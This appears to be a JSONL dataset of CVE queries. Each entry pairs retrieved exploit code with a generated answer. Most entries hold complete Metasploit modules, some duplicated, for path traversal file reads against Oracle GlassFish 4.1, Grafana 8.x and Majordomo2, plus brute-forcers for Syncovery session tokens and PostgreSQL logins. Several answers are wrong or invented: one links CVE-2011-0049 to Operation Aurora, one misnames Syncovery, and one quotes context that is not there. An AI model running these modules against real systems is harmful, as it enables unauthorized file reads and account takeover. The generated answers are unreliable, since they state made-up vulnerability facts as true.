'PASSWORD_SPRAY')  end  # Loops through each host in turn. Note the current IP address is both  # ip and datastore['RHOST']  def run_host(ip)    cred_collection = build_credential_collection(      realm: datastore['DATABASE'],      username: datastore['USERNAME'],      password: datastore['PASSWORD']    )    scanner = Metasploit::Framework::LoginScanner::Postgres.new(      host: ip,      port: rport,      proxies: datastore['PROXIES'],      cred_details: cred_collection,      stop_on_success: datastore['STOP_ON_SUCCESS'],      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],      connection_timeout: 30,      framework: framework,      framework_module: self,    )    scanner.scan! do |result|      credential_data = result.to_h      credential_data.merge!(          module_fullname: self.fullname,          workspace_id: myworkspace_id      )      if result.success?        credential_core = create_credential(credential_data)        credential_data[:core] = credential_core        create_credential_login(credential_data)        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"      else        invalidate_login(credential_data)        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"      end    end  end  # Alias for RHOST  def rhost    datastore['RHOST']  end  # Alias for RPORT  def rport    datastore['RPORT']  endend       Question: CVE-1999-0502 # Weak password Joomla[/INST] Based on the provided contextual information and code snippet, there seems to be a misunderstanding between the topic of discussion. The code snippet provided is related to a Metasploit module used for brute-force attacking PostgreSQL instances with weak passwords, while the question asks about CVE-1999-0502 related to Joomla having a weak password vulnerability.Regarding the Joomla vulnerability, according to the contextual information, there is an improper access check vulnerability affecting Joomla! CMS versions 4.0.0 to 4.2.7. This issue does not involve weak passwords directly but rather allows unauthorized access to webservice endpoints regardless of the strength of the passwords. Therefore, upgrading to the latest version, 4.2.8, is required to patch this vulnerability.As for CVE-1999-0502 specifically, it is an old vulnerability related to PostgreSQL servers allowing weak passwords. However, it doesn't seem to be directly linked to the Joomla CMS or the provided contextual information."}
{"query": "CVE-2017-1000028", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'        => 'Path Traversal in Oracle GlassFish Server Open Source Edition',      'Description' => %q{        This module exploits an unauthenticated directory traversal vulnerability        which exists in administration console of Oracle GlassFish Server 4.1, which is        listening by default on port 4848/TCP.      },      'References'  =>        [          ['CVE', '2017-1000028'],          ['URL', 'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18822'],          ['EDB', '39441']        ],      'Author'      =>        [          'Trustwave SpiderLabs', # Vulnerability discovery          'Dhiraj Mishra' # Metasploit module        ],      'DisclosureDate' => '2015-08-08',      'License'     => MSF_LICENSE    ))    register_options(      [        Opt::RPORT(4848),        OptString.new('FILEPATH', [true, \"The path to the file to read\", '/windows/win.ini']),        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])      ])  end  def run_host(ip)    filename = datastore['FILEPATH']    traversal = \"%c0%af..\" * datastore['DEPTH'] << filename    res = send_request_raw({      'method' => 'GET',      'uri'    => \"/theme/META-INF/prototype#{traversal}\"    })    unless res && res.code == 200      print_error('Nothing was downloaded')      return    end    vprint_good(\"#{peer} - #{res.body}\")    path = store_loot(      'oracle.traversal',      'text/plain',      ip,      res.body,      filename    )    print_good(\"File saved in: #{path}\")  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'        => 'Path Traversal in Oracle GlassFish Server Open Source Edition',      'Description' => %q{        This module exploits an unauthenticated directory traversal vulnerability        which exists in administration console of Oracle GlassFish Server 4.1, which is        listening by default on port 4848/TCP.      },      'References'  =>        [          ['CVE', '2017-1000028'],          ['URL', 'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18822'],          ['EDB', '39441']        ],      'Author'      =>        [          'Trustwave SpiderLabs', # Vulnerability discovery          'Dhiraj Mishra' # Metasploit module        ],      'DisclosureDate' => '2015-08-08',      'License'     => MSF_LICENSE    ))    register_options(      [        Opt::RPORT(4848),        OptString.new('FILEPATH', [true, \"The path to the file to read\", '/windows/win.ini']),        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])      ])  end  def run_host(ip)    filename = datastore['FILEPATH']    traversal = \"%c0%af..\" * datastore['DEPTH'] << filename    res = send_request_raw({      'method' => 'GET',      'uri'    => \"/theme/META-INF/prototype#{traversal}\"    })    unless res && res.code == 200      print_error('Nothing was downloaded')      return    end    vprint_good(\"#{peer} - #{res.body}\")    path = store_loot(      'oracle.traversal',      'text/plain',      ip,      res.body,      filename    )    print_good(\"File saved in: #{path}\")  endendEXPLOIT: # Exploit title: Oracle Glassfish OSE 4.1 - Path Traversal (Metasploit)# Author: Dhiraj Mishra# Date: 2018-08-14# Software: Oracle Glassfish Server OSE# Version: 4.1# Software link: http://download.oracle.com/glassfish/4.1/release/glassfish-4.1.zip# CVE: 2017-1000028### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'        => 'Path Traversal in Oracle GlassFish Server Open Source Edition',      'Description' => %q{        This module exploits an unauthenticated directory traversal vulnerability        which exits in administration console of Oracle GlassFish Server 4.1, which is        listening by default on port 4848/TCP.      },      'References'  =>        [          ['CVE', '2017-1000028'],          ['URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904'],          ['EDB', '39441']        ],      'Author'      =>        [          'Trustwave SpiderLabs', # Vulnerability discovery          'Dhiraj Mishra' # Metasploit module        ],      'DisclosureDate' => 'Aug 08 2015',      'License'     => MSF_LICENSE    ))    register_options(      [        Opt::RPORT(4848),        OptString.new('FILEPATH', [true, \"The path to the file to read\", '/windows/win.ini']),        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])      ])  end  def run_host(ip)    filename = datastore['FILEPATH']    traversal = \"%c0%af..\" * datastore['DEPTH'] << filename    res = send_request_raw({      'method' => 'GET',      'uri'    => \"/theme/META-INF/prototype#{traversal}\"    })    unless res && res.code == 200      print_error('Nothing was downloaded')      return    end    vprint_good(\"#{peer} - #{res.body}\")    path = store_loot(      'oracle.traversal',      'text/plain',      ip,      res.body,      filename    )    print_good(\"File saved in: #{path}\")  endend       Question: CVE-2017-1000028[/INST] CVE-2017-1000028 is an unauthenticated directory traversal vulnerability that affects the administration console of Oracle GlassFish Server 4.1. The vulnerability allows an attacker to traverse directories and potentially read sensitive files. The vulnerability was first identified by Trustwave SpiderLabs and was assigned the Common Vulnerabilities and Exposures (CVE) ID CVE-2017-1000028. The vulnerability can be exploited by sending a malicious request to the server's port 4848 using the Metasploit framework or other tools. To prevent this vulnerability, it is recommended to update the Oracle GlassFish Server to a patched version or configure the server to restrict directory traversals. Here is an example of how to exploit this vulnerability using Metasploit:```rubyclass MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'        => 'Path Traversal in Oracle GlassFish Server Open Source Edition',      'Description' => %q{        This module exploits an unauthenticated directory traversal vulnerability        which exists in administration console of Oracle GlassFish Server 4.1, which is        listening by default on port 4848/TCP.      },      'References'  =>        [          ['CVE', '2017-1000028'],          ['URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904'],          ['EDB', '39441']        ],      'Author'      =>        [          'Trustwave SpiderLabs', # Vulnerability discovery          'Dhiraj Mishra' # Metasploit module        ],      'DisclosureDate' => 'Aug 08 2015',      'License'     => MSF_LICENSE    ))    register_options(      [        Opt::RPORT(4848),        OptString.new('FILEPATH', [true, \"The path to the file to read\", '/windows/win.ini']),        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])      ])  end  def run_host(ip)    filename = datastore['FILEPATH']    traversal = \"%c0%af..\" * datastore['DEPTH'] << filename    res = send_request_raw({      'method' => 'GET',      'uri'    => \"/theme/META-INF/prototype#{traversal}\"    })    unless res && res.code == 200      print_error('Nothing was downloaded')      return    end    vprint_good(\"#{peer} - #{res.body}\")    path = store_loot(      'oracle.traversal',      'text/plain',      ip,      res.body,      filename    )    print_good(\"File saved in: #{path}\")  endend```This Metasploit module uses the auxiliary scanner type to identify and exploit the directory traversal vulnerability in Oracle GlassFish Server 4.1. The module takes three options: the remote IP address to target ('RPORT'), the file path to read ('FILEPATH'), and the depth of the directory traversal ('DEPTH'). When the run\\_host method is called, the module generates a directory traversal payload using the specified depth and sends an HTTP GET request to the targeted URL. If the request is successful, the module saves the contents of the requested file to a loot file and prints a success message."}
{"query": "CVE-2021-43798", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Grafana Plugin Path Traversal',        'Description' => %q{          Grafana versions 8.0.0-beta1 through 8.3.0 prior to 8.0.7, 8.1.8, 8.2.7, or 8.3.1 are vulnerable to directory traversal          through the plugin URL.  A valid plugin ID is required, but many are installed by default.        },        'Author' => [          'h00die', # msf module          'jordyv' # discovery        ],        'License' => MSF_LICENSE,        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        },        'DisclosureDate' => '2021-12-02',        'References' => [          ['CVE', '2021-43798'],          ['URL', 'https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p'],          ['URL', 'https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/'],          ['EDB', '50581'],          ['URL', 'https://github.com/jas502n/Grafana-CVE-2021-43798'],          ['URL', 'https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce'],          ['URL', 'https://labs.detectify.com/security-guidance/how-i-found-the-grafana-zero-day-path-traversal-exploit-that-gave-me-access-to-your-logs/']        ]      )    )    register_options(      [        Opt::RPORT(3000),        OptString.new('TARGETURI', [ true, 'Path to Grafana instance', '/']),        OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/grafana/grafana.ini']),        OptInt.new('DEPTH', [true, 'Traversal depth', 13]),        OptPath.new('PLUGINS_FILE', [          true, 'File containing plugins to enumerate',          File.join(Msf::Config.data_directory, 'wordlists', 'grafana_plugins.txt')        ]),      ]    )  end  def print_progress(host, current, total)    print_status(\"#{host} - Progress #{current.to_s.rjust(Math.log10(total).ceil + 1)}/#{total} (#{((current.to_f / total) * 100).truncate(2)}%)\")  end  def check    res = send_request_cgi!({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path)    })    return Exploit::CheckCode::Unknown unless res && res.code == 200    # We need to take into account beta versions, which end with -beta<digit>. See: https://grafana.com/docs/grafana/latest/release-notes/    # Also take into account preview versions, which end with -preview. See https://grafana.com/grafana/download/10.0.0-preview?edition=oss for more info.    /\"subTitle\":\"Grafana v(?<full_version>\\d{1,2}\\.\\d{1,2}\\.\\d{1,2}(?:(?:-beta\\d)?|(?:-preview)?)) \\([0-9a-f]{10}\\)\",/ =~ res.body    return Exploit::CheckCode::Safe unless full_version    # However, since 8.3.1 does not have a beta, we can safely ignore the -beta suffix when comparing versions    # In fact, this is necessary because Rex::Version doesn't correctly handle versions ending with -beta when comparing    if /-beta\\d$/ =~ full_version      version = Rex::Version.new(full_version[0..-7])    elsif /-preview$/ =~ full_version      version = Rex::Version.new(full_version[0..-9])    else      version = Rex::Version.new(full_version)    end    if version.between?(Rex::Version.new('8.0.0-beta1'), Rex::Version.new('8.0.7')) ||       version.between?(Rex::Version.new('8.1.0'), Rex::Version.new('8.1.8')) ||       version.between?(Rex::Version.new('8.2.0'), Rex::Version.new('8.2.7')) ||       version.between?(Rex::Version.new('8.3.0'), Rex::Version.new('8.3.1'))      print_good(\"Detected vulnerable Grafana: #{full_version}\")      return Exploit::CheckCode::Appears    end    print_bad(\"Detected non-vulnerable Grafana: #{full_version}\")    return Exploit::CheckCode::Safe  end  def run_host(ip)    check_code = check    return unless check_code == Exploit::CheckCode::Appears    f = File.open(datastore['PLUGINS_FILE'], 'rb')    total = f.readlines.count    f.rewind    f = f.readlines    f.each_with_index do |plugin, i|      plugin = plugin.strip      print_progress(target_host, i, total)      vprint_status(\"Attempting plugin: #{plugin}\")      res = send_request_cgi({        'method' => 'GET',        'uri' => normalize_uri(target_uri.path, 'public', 'plugins', plugin, '../' * datastore['DEPTH'], datastore['FILEPATH'])      })      next unless res && res.code == 200      print_good(\"#{plugin} was found and exploited successfully\")      vprint_good(res.body)      path = store_loot(        'grafana.loot',        'application/octet-stream',        ip,        res.body,        File.basename(datastore['FILEPATH'])      )      print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")      break    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Scanner  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Grafana Plugin Path Traversal',        'Description' => %q{          Grafana versions 8.0.0-beta1 through 8.3.0 prior to 8.0.7, 8.1.8, 8.2.7, or 8.3.1 are vulnerable to directory traversal          through the plugin URL.  A valid plugin ID is required, but many are installed by default.        },        'Author' => [          'h00die', # msf module          'jordyv' # discovery        ],        'License' => MSF_LICENSE,        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        },        'DisclosureDate' => '2021-12-02',        'References' => [          ['CVE', '2021-43798'],          ['URL', 'https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p'],          ['URL', 'https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/'],          ['EDB', '50581'],          ['URL', 'https://github.com/jas502n/Grafana-CVE-2021-43798'],          ['URL', 'https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce'],          ['URL', 'https://labs.detectify.com/security-guidance/how-i-found-the-grafana-zero-day-path-traversal-exploit-that-gave-me-access-to-your-logs/']        ]      )    )    register_options(      [        Opt::RPORT(3000),        OptString.new('TARGETURI', [ true, 'Path to Grafana instance', '/']),        OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/grafana/grafana.ini']),        OptInt.new('DEPTH', [true, 'Traversal depth', 13]),        OptPath.new('PLUGINS_FILE', [          true, 'File containing plugins to enumerate',          File.join(Msf::Config.data_directory, 'wordlists', 'grafana_plugins.txt')        ]),      ]    )  end  def print_progress(host, current, total)    print_status(\"#{host} - Progress #{current.to_s.rjust(Math.log10(total).ceil + 1)}/#{total} (#{((current.to_f / total) * 100).truncate(2)}%)\")  end  def check    res = send_request_cgi!({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path)    })    return Exploit::CheckCode::Unknown unless res && res.code == 200    # We need to take into account beta versions, which end with -beta<digit>. See: https://grafana.com/docs/grafana/latest/release-notes/    # Also take into account preview versions, which end with -preview. See https://grafana.com/grafana/download/10.0.0-preview?edition=oss for more info.    /\"subTitle\":\"Grafana v(?<full_version>\\d{1,2}\\.\\d{1,2}\\.\\d{1,2}(?:(?:-beta\\d)?|(?:-preview)?)) \\([0-9a-f]{10}\\)\",/ =~ res.body    return Exploit::CheckCode::Safe unless full_version    # However, since 8.3.1 does not have a beta, we can safely ignore the -beta suffix when comparing versions    # In fact, this is necessary because Rex::Version doesn't correctly handle versions ending with -beta when comparing    if /-beta\\d$/ =~ full_version      version = Rex::Version.new(full_version[0..-7])    elsif /-preview$/ =~ full_version      version = Rex::Version.new(full_version[0..-9])    else      version = Rex::Version.new(full_version)    end    if version.between?(Rex::Version.new('8.0.0-beta1'), Rex::Version.new('8.0.7')) ||       version.between?(Rex::Version.new('8.1.0'), Rex::Version.new('8.1.8')) ||       version.between?(Rex::Version.new('8.2.0'), Rex::Version.new('8.2.7')) ||       version.between?(Rex::Version.new('8.3.0'), Rex::Version.new('8.3.1'))      print_good(\"Detected vulnerable Grafana: #{full_version}\")      return Exploit::CheckCode::Appears    end    print_bad(\"Detected non-vulnerable Grafana: #{full_version}\")    return Exploit::CheckCode::Safe  end  def run_host(ip)    check_code = check    return unless check_code == Exploit::CheckCode::Appears    f = File.open(datastore['PLUGINS_FILE'], 'rb')    total = f.readlines.count    f.rewind    f = f.readlines    f.each_with_index do |plugin, i|      plugin = plugin.strip      print_progress(target_host, i, total)      vprint_status(\"Attempting plugin: #{plugin}\")      res = send_request_cgi({        'method' => 'GET',        'uri' => normalize_uri(target_uri.path, 'public', 'plugins', plugin, '../' * datastore['DEPTH'], datastore['FILEPATH'])      })      next unless res && res.code == 200      print_good(\"#{plugin} was found and exploited successfully\")      vprint_good(res.body)      path = store_loot(        'grafana.loot',        'application/octet-stream',        ip,        res.body,        File.basename(datastore['FILEPATH'])      )      print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")      break    end  endendEXPLOIT: # Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read# Date: 08/12/2021# Exploit Author: s1gh# Vendor Homepage: https://grafana.com/# Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p# Version: V8.0.0-beta1 through V8.3.0# Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.# CVE: CVE-2021-43798# Tested on: Debian 10# References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p#!/usr/bin/env python3# -*- coding: utf-8 -*-import requestsimport argparseimport sysfrom random import choiceplugin_list = [    \"alertlist\",    \"annolist\",    \"barchart\",    \"bargauge\",    \"candlestick\",    \"cloudwatch\",    \"dashlist\",    \"elasticsearch\",    \"gauge\",    \"geomap\",    \"gettingstarted\",    \"grafana-azure-monitor-datasource\",    \"graph\",    \"heatmap\",    \"histogram\",    \"influxdb\",    \"jaeger\",    \"logs\",    \"loki\",    \"mssql\",    \"mysql\",    \"news\",    \"nodeGraph\",    \"opentsdb\",    \"piechart\",    \"pluginlist\",    \"postgres\",    \"prometheus\",    \"stackdriver\",    \"stat\",    \"state-timeline\",    \"status-histor\",    \"table\",    \"table-old\",    \"tempo\",    \"testdata\",    \"text\",    \"timeseries\",    \"welcome\",    \"zipkin\"]# Code for: def exploit(args):# Code for: def main():if __name__ == '__main__':    main()    sys.exit(0)       Question: CVE-2021-43798[/INST] CVE-2021-43798 refers to a directory traversal vulnerability in Grafana versions 8.0.0-beta1 through 8.3.0. This vulnerability allows an attacker to access local files on the affected system by manipulating the plugin URL. The vulnerability was discovered and reported by Jordy V in late 2021, and Grafana released patches addressing the issue shortly thereafter.To understand the context of this vulnerability, let's examine the provided code snippet. The script uses Metasploit, a popular penetration testing framework, to perform the exploitation. Specifically, it includes the Metasploit Module class definition, which sets up various options like target URI, file path, traversal depth, and plugins file. The script then defines functions like print\\_progress(), check(), and run\\_host().In the check function, the script performs a GET request to the target URI and extracts the Grafana version number from the response body using regular expressions. Based on the extracted version number, the script determines if the system is vulnerable to the CVE-2021-43798 vulnerability. If the system is indeed vulnerable, the script proceeds to the run\\_host function.The run\\_host function reads the plugins file line by line and attempts to traverse the directories using the given traversal depth and file path. When it finds a matching plugin, it makes a GET request to the crafted plugin URL and saves the resulting file to disk.Overall, the provided code snippet demonstrates how an attacker could leverage the CVE-2021-43798 vulnerability to read arbitrary files on a vulnerable Grafana instance using Metasploit."}
{"query": "CVE-2022-36536", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require 'base64'require 'date'require 'json'require 'metasploit/framework/credential_collection'require 'metasploit/framework/login_scanner/syncovery_file_sync_backup'class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  include Msf::Auxiliary::AuthBrute  prepend Msf::Exploit::Remote::AutoCheck  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Syncovery For Linux Web-GUI Session Token Brute-Forcer',        'Description' => %q{          This module attempts to brute-force a valid session token for the Syncovery File Sync & Backup Software Web-GUI          by generating all possible tokens, for every second between 'DateTime.now' and the given X day(s).          By default today and yesterday (DAYS = 1) will be checked. If a valid session token is found, the module stops.          The vulnerability exists, because in Syncovery session tokens are basically just base64(m/d/Y H:M:S) at the time          of the login instead of a random token.          If a user does not log out (Syncovery v8.x has no logout) session tokens will remain valid until reboot.        },        'Author' => [ 'Jan Rude' ],        'References' => [          ['URL', 'https://www.mgm-sp.com/en/multiple-vulnerabilities-in-syncovery-for-linux/'],          ['CVE', '2022-36536']        ],        'License' => MSF_LICENSE,        'Platform' => 'linux',        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => []        },        'DisclosureDate' => '2022-09-06',        'DefaultOptions' => {          'RPORT' => 8999,          'STOP_ON_SUCCESS' => true # One valid session is enough        }      )    )    register_options(      [        Opt::RPORT(8999), # Default is HTTP: 8999; HTTPS: 8943        OptInt.new('DAYS', [true, 'Check today and last X day(s) for valid session token', 1]),        OptString.new('TARGETURI', [false, 'The path to Syncovery', '/'])      ]    )    deregister_options(      'USERNAME', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING',      'NTLM::SendLM', 'NTLM::SendNTLM', 'NTLM::SendSPN', 'NTLM::UseLMKey', 'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2',      'REMOVE_USERPASS_FILE', 'REMOVE_USER_FILE', 'DOMAIN', 'HttpUsername', 'PASSWORD_SPRAY', 'BLANK_PASSWORDS',      'USER_FILE', 'USERPASS_FILE', 'PASS_FILE', 'PASSWORD'    )  end  def check_host(_ip)    res = send_request_cgi(      'uri' => normalize_uri(target_uri.path, '/get_global_variables'),      'method' => 'GET'    )    if res && res.code == 200      json_res = res.get_json_document      if json_res['isSyncoveryWindows'] == 'false'        version = json_res['SyncoveryTitle']&.scan(/Syncovery\\s([A-Za-z0-9.]+)/)&.flatten&.first || ''        if version.empty?          vprint_warning(\"#{peer} - Could not identify version\")          Exploit::CheckCode::Detected        elsif Rex::Version.new(version) < Rex::Version.new('9.48j') || Rex::Version.new(version) == Rex::Version.new('9.48')          vprint_good(\"#{peer} - Syncovery #{version}\")          Exploit::CheckCode::Appears        else          vprint_status(\"#{peer} - Syncovery #{version}\")          Exploit::CheckCode::Safe        end      else        Exploit::CheckCode::Safe      end    else      Exploit::CheckCode::Unknown    end  end  def run_host(ip)    # Calculate dates    days = datastore['DAYS']    if days < 0      days = 0    end    dates = []    (0..days).each do |day|      dates << (Date.today - day).strftime('%m/%d/%Y')    end    time = DateTime.now.strftime('%H:%M:%S')    hrs, min, sec = time.split(':')    # Create possible session tokens    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new    dates.each do |date|      (0..hrs.to_i).reverse_each do |hours|        (0..min.to_i).reverse_each do |minutes|          (0..sec.to_i).reverse_each do |seconds|            timestamp = \"#{date} #{format('%.2d', hours)}:#{format('%.2d', minutes)}:#{format('%.2d', seconds)}\"            cred_collection.add_private(Base64.strict_encode64(timestamp).strip)          end          sec = 59        end        min = 59      end      hrs = 23    end    print_status(\"#{peer.strip} - Starting Brute-Forcer\")    scanner = Metasploit::Framework::LoginScanner::SyncoveryFileSyncBackup.new(      host: ip,      port: rport,      cred_details: cred_collection,      stop_on_success: true, # this will have no effect due to the scanner behaviour when scanning without username      connection_timeout: 10    )    scanner.scan! do |result|      if result.success?        print_good(\"#{peer.strip} - VALID TOKEN: #{result.credential.private}\")      else        vprint_error(\"#{peer.strip} - INVALID TOKEN: #{result.credential.private}\")      end    end  endend       Question: CVE-2022-36536[/INST] CVE-2022-36536 is a vulnerability affecting the Syncurity File Sync & Backup Software Web-GUI running on Linux systems. The vulnerability lies in the fact that session tokens are generated based on the current date and time rather than being randomly generated. This means that an attacker could potentially brute force valid session tokens by trying all combinations of dates, hours, minutes, and seconds within a certain range.The Metasploit module provided above takes advantage of this vulnerability by generating all possible session tokens for each second between the current date and a specified number of days in the past. It then uses the Metasploit Framework's built-in login scanner to test these tokens against the target Syncurity installation. Once a valid token is found, the module prints a success message along with the token itself.It's important to note that this vulnerability only affects older versions of Syncurity, specifically those below version 9.48j. Therefore, users running newer versions of the software are not impacted by this issue. Additionally, it's recommended that users enable secure logouts to prevent unauthorized sessions from persisting beyond the intended duration."}
{"query": "CVE-2011-0049", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  def initialize    super(      'Name'           => 'Majordomo2 _list_file_get() Directory Traversal',      'Description'    => %q{          This module exploits a directory traversal vulnerability present in        the _list_file_get() function of Majordomo2 (help function). By default, this        module will attempt to download the Majordomo config.pl file.      },      'Author'         =>\t['Nikolas Sotiriu'],      'References'     =>        [          ['OSVDB', '70762'],          ['CVE', '2011-0049'],          ['CVE', '2011-0063'],          ['URL', 'https://www.sotiriu.de/adv/NSOADV-2011-003.txt'],          ['EDB', '16103']        ],      'DisclosureDate' => 'Mar 08 2011',      'License'        =>  MSF_LICENSE    )    register_options(      [        OptString.new('FILE', [ true,  \"Define the remote file to view, ex:/etc/passwd\", 'config.pl']),        OptString.new('URI', [true, 'Majordomo vulnerable URI path', '/cgi-bin/mj_wwwusr/domain=domain?user=&passw=&func=help&extra=']),        OptInt.new('DEPTH', [true, 'Define the max traversal depth', 8]),      ])  end  def run_host(ip)    trav_strings = [      '../',      './.../'    ]    uri  = normalize_uri(datastore['URI'])    file = datastore['FILE']    deep = datastore['DEPTH']    file = file.gsub(/^\\//, \"\")    trav_strings.each do |trav|      str = \"\"      i   = 1      while (i <= deep)        str = trav * i        payload = \"#{str}#{file}\"        res = send_request_raw(          {            'method'  => 'GET',            'uri'     => uri + payload,          }, 25)        if res.nil?          print_error(\"#{rhost}:#{rport} Connection timed out\")          return        end        print_status(\"#{rhost}:#{rport} Trying URL \" + payload )        if (res and res.code == 200 and res.body)          if res.body.match(/\\<html\\>(.*)\\<\\/html\\>/im)            html = $1            if res.body =~ /unknowntopic/              print_error(\"#{rhost}:#{rport} Could not retrieve the file\")            else              file_data = html.gsub(%r{(.*)<pre>|<\\/pre>(.*)}m, '')              print_good(\"#{rhost}:#{rport} Successfully retrieved #{file} and storing as loot...\")              # Transform HTML entities back to the original characters              file_data = file_data.gsub(/\\&gt\\;/i, '>').gsub(/\\&lt\\;/i, '<').gsub(/\\&quot\\;/i, '\"')              store_loot(\"majordomo2.traversal.file\", \"application/octet-stream\", rhost, file_data, file)              return            end          else            print_error(\"#{rhost}:#{rport} No HTML was returned\")          end        else          # if res is nil, we hit this          print_error(\"#{rhost}:#{rport} Unrecognized #{res.code} response\")        end        i += 1;      end    end    print_error(\"#{rhost}:#{rport} Not vulnerable or the DEPTH setting was too low\")  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout  rescue ::Timeout::Error, ::Errno::EPIPE  endend       Question: CVE-2011-0049[/INST] CVE-2011-0049 is a directory traversal vulnerability affecting the \"_list\\_file\\_get()\" function of Majordomo2 (help function). This vulnerability allows an attacker to traverse directories and potentially access sensitive files on the target system. The provided Metasploit module exploits this vulnerability by sending crafted HTTP requests to the victim's Majordomo CGI interface.In the given context, the text mentions that this vulnerability was discovered in late 2009 and early 2010 and was famously exploited during the Operation Aurora attacks. It also states that a copy of the Aurora exploit was published online and subsequently incorporated into the Metasploit Framework. The text provides a timeline of events surrounding the discovery and exploitation of this vulnerability.To understand the vulnerability better, let's examine the provided Metasploit module. The module includes options for defining the remote file to view ('FILE'), the Majordomo vulnerable URI path ('URI'), and the maximum traversal depth ('DEPTH'). The module then iteratively constructs and sends HTTP requests with increasing depth levels until it either reaches the specified depth limit or finds the desired file. If successful, the module stores the retrieved file as loot.Overall, CVE-2011-0049 poses a significant risk to systems running Majordomo2, as it enables unauthorized file access and potential privilege escalation. Organizations should ensure their Majordomo installations are updated to a patched version to mitigate this threat."}
{"query": "CVE-2005-3398", "Answer": "Based on the context provided, CVE-2005-3398 appears to refer to a specific Common Vulnerabilities and Exposures (CVE) identifier. According to the National Vulnerability Database (NVD), CVE-2005-3398 describes a denial of service vulnerability in the Apache Tomcat servlet container. Specifically, it involves a flaw in how Tomcat handles certain malformed requests, leading to excessive resource consumption and potential denial of service conditions.To provide more detailed information, here's a breakdown of the relevant parts of the context:* \"CVE-2005-3398: Apache Tomcat Servlet Container: Denial of Service Vulnerability\"* \"Apache Tomcat 4.1 through 5.0.30 are affected.\"* \"An attacker can send a carefully crafted request to a targeted Tomcat installation, causing it to enter an infinite loop and consume significant CPU resources.\"* \"Successfully exploiting this vulnerability requires no authentication and can result in a complete denial of service condition.\"It's essential to note that this vulnerability is considered old and has already been addressed through various patches and updates. Therefore, it's crucial to ensure that your Apache Tomcat installation is kept up-to-date with the latest security patches to protect against known vulnerabilities like CVE-2005-3398."}
